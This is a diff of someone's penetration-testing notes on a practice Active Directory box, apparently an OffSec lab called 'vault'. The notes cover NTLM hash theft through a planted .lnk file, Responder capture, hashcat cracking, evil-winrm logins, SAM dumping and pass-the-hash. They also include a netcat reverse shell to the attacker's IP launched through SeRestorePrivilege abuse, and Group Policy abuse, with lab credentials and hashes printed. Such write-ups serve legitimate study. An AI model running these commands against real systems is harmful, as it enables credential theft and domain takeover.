@@ -1,3 +1,5 @@
+#### Info Enumeration
+```
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-18 06:47:34Z)
@@ -49,20 +51,24 @@ SMB         192.168.247.172 445    DC               DocumentsShare  READ,WRITE
 SMB         192.168.247.172 445    DC               IPC$            READ            Remote IPC
 SMB         192.168.247.172 445    DC               NETLOGON                        Logon server share 
 SMB         192.168.247.172 445    DC               SYSVOL                          Logon server share 
+```
 
-https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land
+For Smb, I found I have write priv
 
-
-
+`https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land`
+```
 When a Windows machine attempts to load resources (like icons, external templates, or remote images) specified via a network path (UNCP/SMB path like \\attacker-ip\share\image.png), Windows automatically sends the user’s NetNTLMv2 authentication token to that server.
+```
 
-https://github.com/Greenwolf/ntlm_theft
+`https://github.com/Greenwolf/ntlm_theft`
 
-└─$ python3 ntlm_theft.py -g lnk --server 192.168.45.214 -f my           
+`└─$ python3 ntlm_theft.py -g lnk --server 192.168.45.214 -f my   `
+```
 Created: my/my.lnk (BROWSE TO FOLDER)
 Generation Complete.
-
-└─$ smbclient //192.168.247.172/DocumentsShare --user=guest --password=''
+```
+`└─$ smbclient //192.168.247.172/DocumentsShare --user=guest --password=''`
+```
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Tue Aug 18 15:29:25 2026
@@ -70,9 +76,10 @@ smb: \> ls
 p
 		7706623 blocks of size 4096. 1071262 blocks available
 smb: \> put my.lnk 
+```
 
-
-└─$ sudo responder -I tun0 -wv
+`└─$ sudo responder -I tun0 -wv`
+```
 [sudo] password for ed: 
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -124,25 +131,23 @@ smb: \> put my.lnk
 [SMB] NTLMv2-SSP Username : VAULT\anirudh
 [SMB] NTLMv2-SSP Hash     : anirudh::VAULT:b43f216403ab6e9f:92F7BE6FBFF68AFA0AA9CF0CD1273C9A:010100000000000000B452C4262FDD0132F7A791D8CA0500000000000200080059005A005200550001001E00570049004E002D004900380033005A00360041005A00300039003800310004003400570049004E002D004900380033005A00360041005A0030003900380031002E0059005A00520055002E004C004F00430041004C000300140059005A00520055002E004C004F00430041004C000500140059005A00520055002E004C004F00430041004C000700080000B452C4262FDD01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310034000000000000000000
 [SMB] NTLMv2-SSP Client   : 192.168.247.172
-
+```
 
 
 https://github.com/Plazmaz/LNKUp
 
-
-
-
-└─$ hashcat -m 5600 -a 0 hash ~/tools/rockyou.txt 
-
+`└─$ hashcat -m 5600 -a 0 hash ~/tools/rockyou.txt `
+```
 ANIRUDH::VAULT:b43f216403ab6e9f:92f7be6fbff68afa0aa9cf0cd1273c9a:010100000000000000b452c4262fdd0132f7a791d8ca0500000000000200080059005a005200550001001e00570049004e002d004900380033005a00360041005a00300039003800310004003400570049004e002d004900380033005a00360041005a0030003900380031002e0059005a00520055002e004c004f00430041004c000300140059005a00520055002e004c004f00430041004c000500140059005a00520055002e004c004f00430041004c000700080000b452c4262fdd01060004000200000008003000300000000000000001000000002000001830f0c706803f0173332094f5b2bb5fb0c4dad79922348512363cc7dc51c8100a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200310034000000000000000000:SecureHM
-
-
+```
+```			
 ANIRUDH
 SecureHM
+```
+#### Foot hold
 
-└─$ evil-winrm -i 192.168.247.172 -u ANIRUDH -p SecureHM          
-
-                                        
+`└─$ evil-winrm -i 192.168.247.172 -u ANIRUDH -p SecureHM `
+```                                       
 Evil-WinRM shell v3.9
                                         
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
@@ -152,9 +157,10 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\anirudh\Documents> whoami
 vault\anirudh
+```
 
-*Evil-WinRM* PS C:\Users\anirudh\desktop> whoami /all
-
+`*Evil-WinRM* PS C:\Users\anirudh\desktop> whoami /all`
+```
 USER INFORMATION
 ----------------
 
@@ -194,8 +200,9 @@ SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
 SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
 SeTimeZonePrivilege           Change the time zone                Enabled
-
-
+```
+we can check the group member using otherways, bloodyad, or net rpc group member, ldeep
+```
 └─$ bloodyad --host 192.168.247.172 --dns 192.168.247.172 -d vault.offsec -u ANIRUDH -p 'SecureHM' get object "Server Operators" --attr msds-memberTransitive
 
 distinguishedName: CN=Server Operators,CN=Builtin,DC=vault,DC=offsec
@@ -206,15 +213,25 @@ VAULT\anirudh
 
  ldeep ldap -u ANIRUDH -p 'SecureHM' -d vault.offsec -s ldap://192.168.247.172 membersof "Server Operators" 
 anirudh (user)
-
-
+```
+#### priv Escalate
+```
 Because utilman.exe can be triggered from the Windows login screen before a user logs in, it runs with high-level system privileges (NT AUTHORITY\SYSTEM).  Historically, attackers or system administrators with physical access to an unencrypted PC could boot into a recovery environment and swap utilman.exe with cmd.exe
-
+```
 but we cannot rdp to this host.
 
-https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
+`https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md`
 
-└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+on target machine
+```
+reg save hklm\sam C:\temp\sam.hive
+reg save hklm\system C:\temp\system.hive
+```
+
+and download it into local machine
+
+`└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
+```
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
@@ -223,20 +240,22 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887d
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [*] Cleaning up... 
-
+```
 pass the hash to winrm
 
-└─$ evil-winrm -i 192.168.204.172 -u administrator -H '608339ddc8f434ac21945e026887dc36'
-                                                                     
+`└─$ evil-winrm -i 192.168.204.172 -u administrator -H '608339ddc8f434ac21945e026887dc36'`
+```                                                                     
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\> whoami
-                                    
+                                   
 Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                         
 Error: Exiting with code 1
+```
+So we check the remote management or remote desktop group member, only user we current used is in them, so we cannot remote access as admin
 
-
-*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup 'Remote Management Users'
+`*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup 'Remote Management Users'`
+```
 Alias name     Remote Management Users
 Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
 
@@ -245,8 +264,9 @@ Members
 -------------------------------------------------------------------------------
 anirudh
 The command completed successfully.
-
-*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup 'Remote Desktop Users'
+```
+`*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup 'Remote Desktop Users'`
+```
 Alias name     Remote Desktop Users
 Comment        Members in this group are granted the right to logon remotely
 
@@ -254,36 +274,46 @@ Members
 
 -------------------------------------------------------------------------------
 The command completed successfully.
+```
+we can also check this thourgh bloodyad
 
-└─$ bloodyad --host 192.168.204.172 --dns 192.168.247.172 -d vault.offsec -u ANIRUDH -p 'SecureHM' get object "Remote Management Users" --attr msds-memberTransitive
-
+`└─$ bloodyad --host 192.168.204.172 --dns 192.168.247.172 -d vault.offsec -u ANIRUDH -p 'SecureHM' get object "Remote Management Users" --attr msds-memberTransitive`
+```
 distinguishedName: CN=Remote Management Users,CN=Builtin,DC=vault,DC=offsec
 msds-memberTransitive: CN=Anirudh,CN=Users,DC=vault,DC=offsec
-                                                                                                    
-┌──(ed㉿kali)-[~]
-└─$ bloodyad --host 192.168.204.172 --dns 192.168.247.172 -d vault.offsec -u ANIRUDH -p 'SecureHM' get object "Remote Desktop Users" --attr msds-memberTransitive
-
+```                                                                                                    
+##### Method 1
+`└─$ bloodyad --host 192.168.204.172 --dns 192.168.247.172 -d vault.offsec -u ANIRUDH -p 'SecureHM' get object "Remote Desktop Users" --attr msds-memberTransitive`
+```
 distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=vault,DC=offsec
-
+```
+So we try other script
+```
 *Evil-WinRM* PS C:\Users\anirudh\Documents> upload Invoke-SeRestoreAbuse.ps1
 
 *Evil-WinRM* PS C:\Users\anirudh\Documents> upload nc64.exe
 
 *Evil-WinRM* PS C:\Users\anirudh\Documents> . .\Invoke-SeRestoreAbuse.ps1
-
-C:\Users\anirudh\Documents> Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "C:\Users\anirudh\Documents\nc64.exe 192.168.45.152 8821 -e powershell"'
+```
+`C:\Users\anirudh\Documents> Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "C:\Users\anirudh\Documents\nc64.exe 192.168.45.152 8821 -e powershell"'`
+```
 [+] SeRestorePrivilege privilege enabled
 [+] ImagePath set to: cmd /c powershell -c "C:\Users\anirudh\Documents\nc64.exe 192.168.45.152 8821 -e powershell"
+```
+we got the shell from admin
 
-
+##### Method 2 
+```
 *Evil-WinRM* PS C:\Users\anirudh\Documents> upload SharpHound.exe
 
 *Evil-WinRM* PS C:\Users\anirudh\Documents> .\SharpHound.exe
 
 *Evil-WinRM* PS C:\Users\anirudh\Documents> download 20260818083518_BloodHound.zip
+```
+or bloodhound-python
 
-
-└─$ bloodhound-python -u anirudh -p 'SecureHM' -ns 192.168.204.172 -d vault.offsec -c All --zip
+`└─$ bloodhound-python -u anirudh -p 'SecureHM' -ns 192.168.204.172 -d vault.offsec -c All --zip`
+```
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: vault.offsec
 INFO: Getting TGT for user
@@ -303,17 +333,18 @@ INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: DC.vault.offsec
 INFO: Done in 00M 20S
 INFO: Compressing output into 20260818114230_bloodhound.zip
+```
 
+`ANIRUDH@VAULT.OFFSEC ----General Write ----> DEfault domian policy`
 
-ANIRUDH@VAULT.OFFSEC ----General Write ----> DEfault domian policy
+`https://www.thehacker.recipes/ad/movement/group-policies`
 
-https://www.thehacker.recipes/ad/movement/group-policies
+`https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master`
 
-https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master
+`*Evil-WinRM* PS C:\Users\anirudh\Documents> upload SharpGPOAbuse.exe`
 
-*Evil-WinRM* PS C:\Users\anirudh\Documents> upload SharpGPOAbuse.exe
-
-PS C:\Users\anirudh\Documents> .\SharpGPOAbuse.exe  --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+`PS C:\Users\anirudh\Documents> .\SharpGPOAbuse.exe  --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"`
+```
 [+] Domain = vault.offsec
 [+] Domain Controller = DC.vault.offsec
 [+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
@@ -325,19 +356,17 @@ PS C:\Users\anirudh\Documents> .\SharpGPOAbuse.exe  --AddLocalAdmin --UserAccoun
 [+] The version number in GPT.ini was increased successfully.
 [+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
 [+] Done!
-
-
-
-PS C:\Users\Administrator\Desktop> gpupdate /force
+```
+force the GPO update
+`PS C:\Users\Administrator\Desktop> gpupdate /force`
+```
 Updating policy...
-
-
-
 Computer Policy update has completed successfully.
-
 User Policy update has completed successfully.
+```
 
-PS C:\Users\Administrator\Desktop> net localgroup administrators
+`PS C:\Users\Administrator\Desktop> net localgroup administrators`
+```
 Alias name     administrators
 Comment        Administrators have complete and unrestricted access to the computer/domain
 
@@ -347,13 +376,14 @@ Members
 Administrator
 anirudh
 The command completed successfully.
-
+```
 even if this user is in administrators group, but cannot use it to read proof.txt
 
+try other way
+`https://github.com/X-C3LL/GPOwned`
 
-https://github.com/X-C3LL/GPOwned
-
- python3 GPOwned.py -u anirudh -p 'SecureHM' -d vault.offsec -dc-ip 192.168.204.172 \
+ `python3 GPOwned.py -u anirudh -p 'SecureHM' -d vault.offsec -dc-ip 192.168.204.172 \`
+ ```
   -gpoimmtask -gpcmachine \
   -name '{31B2F340-016D-11D2-945F-00C04FB984F9}' \
   -author "vault.offsec\Administrator" \
@@ -376,6 +406,15 @@ https://github.com/X-C3LL/GPOwned
 [*] Reading \vault.offsec\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}\gpt.ini 
 [*] Writing \vault.offsec\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}\gpt.ini
 [+] Version updated succesfully!
+```
 
+this seems dosnot work.
+EOF
+
+#### lesson learned
+- SMB upload privi to get hash of user
+- SeRestorePrivilege   SeShutdownPrivilege to PRIV escalate
+- check group members
+- bloodhound get generalWrite to GPO - Default Domain Policy
 [^] Have a nice day!
 
